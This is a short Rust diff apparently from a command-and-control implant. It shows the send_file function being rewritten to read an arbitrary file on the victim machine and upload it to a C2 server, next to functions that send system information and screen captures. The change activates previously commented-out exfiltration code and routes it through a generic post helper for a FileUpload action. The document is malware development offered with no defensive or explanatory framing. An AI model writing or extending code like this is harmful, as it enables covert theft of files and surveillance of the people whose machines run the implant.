@@ -88,34 +88,16 @@ async fn send_sys_info() {
 }
 async fn send_file(target_file: String) {
     println!("TODO");
-    /* 
-    let client = reqwest::Client::new();
+
     let file = std::fs::read(&target_file);
     match file {
         Ok(file) => {
-            println!("Sending file");
-            client.put(format!("{}/c2/{}/{}", C2URL, C2ID, target_file).as_str())
-                .body(file)
-                .send()
-                .await;
+            post(c2_actions::FileUpload, target_file, file).await.unwrap();
         }
         Err(_) => {
-            let body = serde_json::to_string(&C2Request::new(
-                RequestHeaders::new(
-                    C2ID.to_string(),
-                    SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(),
-                    RequestActionType::FileUpload
-                ),
-                "Error reading file".to_string()
-            )).unwrap();
-            
-            client.post(format!("{}/{}", C2URL, C2ID).as_str())
-                .body(body)
-                .send().await.unwrap();
+            post(c2_actions::FileUpload, target_file, "Error reading file".as_bytes().to_vec()).await.unwrap();
         }
     }
-    println!("Sending file");
-    */
 }
 async fn send_screen_capture() {
     println!("Sending screen capture");
